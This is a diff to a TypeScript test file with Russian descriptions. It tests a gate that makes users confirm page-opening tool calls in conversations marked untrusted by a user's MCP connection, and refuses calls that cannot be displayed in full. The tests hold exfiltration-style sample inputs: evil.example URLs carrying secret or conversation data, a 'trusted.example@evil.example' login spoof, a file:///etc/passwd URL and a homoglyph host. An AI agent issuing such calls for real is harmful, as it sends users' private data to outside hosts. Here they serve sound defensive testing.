@@ -10,13 +10,13 @@ import {
   CONFIRMATION_TTL_MS,
   confirmationIdFor,
   decideConfirmation,
+  describePageCall,
   gatePaidToolCall,
   hashToolArguments,
   isTopicUntrusted,
   markTopicIfUserMcp,
   markTopicUntrusted,
   readConfirmation,
-  summarizePageCall,
   summarizeToolCall,
   swapConfirmation,
   type TopicConfirmation,
@@ -372,7 +372,7 @@ describe('метка темы и подтверждения (topics.metadata)', 
         expect(held.content).not.toContain('платный');
         const card = marker(held.content);
         expect(card.tool).toBe(call.apiName);
-        expect(card.summary).toBe('Открыть страницу https://evil.example/x?d=секрет');
+        expect(card.summary).toBe(`Открыть страницу ${new URL('https://evil.example/x?d=секрет').href}`);
         expect(card.summary).not.toContain('платный');
       }
       // подтверждённый вызов выполняется один раз
@@ -381,6 +381,27 @@ describe('метка темы и подтверждения (topics.metadata)', 
       await decideConfirmation(db, me, topicId, marker(first.content).id, 'approve');
       expect(await gatePaidToolCall(db, me, topicId, calls[0])).toEqual({ action: 'proceed' });
       expect(await gatePaidToolCall(db, me, topicId, calls[0])).toMatchObject({ action: 'blocked' });
+    });
+
+    it('открытие страницы, которое нельзя показать целиком, не подтверждается вовсе: подтверждения нет, вызов не выполняется', async () => {
+      await markTopicUntrusted(db, me, topicId, 'umcp-aaaaaaaaaaaa');
+      for (const raw of [
+        args({ url: `https://evil.example/?d=${'x'.repeat(400)}` }),
+        args({ url: 'https://trusted.example@evil.example/' }),
+        args({ url: 'https://evil.example/', extra: 'данные беседы' }),
+        'не json',
+      ]) {
+        const result = await gatePaidToolCall(db, me, topicId, {
+          apiName: 'web_fetch',
+          arguments: raw,
+          identifier: 'mcp-arckep-studio-web',
+        });
+        expect(result).toMatchObject({ action: 'blocked', code: 'ARCKEP_CONFIRMATION_UNSUPPORTED' });
+        if (result.action !== 'blocked') throw new Error('unreachable');
+        expect(result.content).toContain('НЕ выполнен');
+        expect(result.content).not.toContain('ARCKEP_CONFIRM ');
+      }
+      expect((await metadataOf())?.arckepConfirmations).toBeUndefined();
     });
 
     it('другая тема того же человека одобрением не пользуется', async () => {
@@ -462,15 +483,44 @@ describe('метка темы и подтверждения (topics.metadata)', 
       expect(hashToolArguments('не json')).toMatch(/^[\da-f]{64}$/);
     });
 
-    it('описание открытия страницы: один адрес, несколько, нет адреса, предел 300 знаков', () => {
-      expect(summarizePageCall('{"url":"https://a.example/p"}')).toBe('Открыть страницу https://a.example/p');
-      expect(summarizePageCall('{"urls":["https://a.example","https://b.example"]}')).toBe(
-        'Открыть страницы https://a.example, https://b.example',
+    it('описание открытия страницы: канонический адрес целиком, ничего не усекается; нельзя показать — отказ', () => {
+      const ok = (apiName: string, raw: unknown) => {
+        const result = describePageCall(apiName, raw);
+        if (!result.ok) throw new Error(`not ok: ${result.reason}`);
+        return result.summary;
+      };
+      const reason = (apiName: string, raw: unknown) => {
+        const result = describePageCall(apiName, raw);
+        return result.ok ? 'OK' : result.reason;
+      };
+
+      expect(ok('web_fetch', '{"url":"https://a.example/p"}')).toBe('Открыть страницу https://a.example/p');
+      expect(ok('crawlMultiPages', '{"urls":["https://a.example","https://b.example/x"]}')).toBe(
+        'Открыть страницы https://a.example/, https://b.example/x',
       );
-      expect(summarizePageCall('{}')).toBe('Открыть страницу');
-      expect(summarizePageCall('не json')).toBe('Открыть страницу');
-      expect(summarizePageCall(`{"url":"https://a.example/${'x'.repeat(500)}"}`).length).toBeLessThanOrEqual(300);
-      expect(summarizePageCall('{"url":"https://a.example/a\nb"}')).not.toContain('\n');
+      // имя узла в punycode, как его откроет загрузчик; пробелы и переводы строк внутри адреса не мешают
+      expect(ok('web_fetch', JSON.stringify({ url: ' https://аpple.example/a\n ' }))).toBe(
+        'Открыть страницу https://xn--pple-43d.example/a',
+      );
+      // объект вместо строки аргументов
+      expect(ok('saveSkillFromUrl', { url: 'https://a.example/SKILL.md' })).toBe('Открыть страницу https://a.example/SKILL.md');
+
+      expect(reason('web_fetch', 'не json')).toContain('не читаются');
+      expect(reason('web_fetch', '[]')).toContain('не читаются');
+      expect(reason('web_fetch', '{}')).toContain('адрес не читается');
+      expect(reason('web_fetch', '{"url":5}')).toContain('адрес не читается');
+      expect(reason('web_fetch', '{"url":"не адрес"}')).toContain('адрес не читается');
+      expect(reason('web_fetch', '{"url":"ftp://a.example/"}')).toContain('не http');
+      expect(reason('web_fetch', '{"url":"file:///etc/passwd"}')).toContain('не http');
+      expect(reason('web_fetch', '{"url":"https://trusted.example@evil.example/"}')).toContain('логин');
+      expect(reason('web_fetch', '{"url":"https://a.example/","note":"данные"}')).toContain('кроме адреса');
+      expect(reason('crawlMultiPages', '{"url":"https://a.example/"}')).toContain('кроме адреса');
+      expect(reason('crawlMultiPages', '{"urls":[]}')).toContain('адресов');
+      expect(
+        reason('crawlMultiPages', JSON.stringify({ urls: Array.from({ length: 6 }, (_, i) => `https://a${i}.example/`) })),
+      ).toContain('адресов');
+      // длинный адрес не усекается, а отклоняется
+      expect(reason('web_fetch', JSON.stringify({ url: `https://a.example/?d=${'x'.repeat(300)}` }))).toContain('слишком длинный');
     });
 
     it('номер запроса: от подключения, инструмента и аргументов; сжатие описания до 300 знаков', () => {
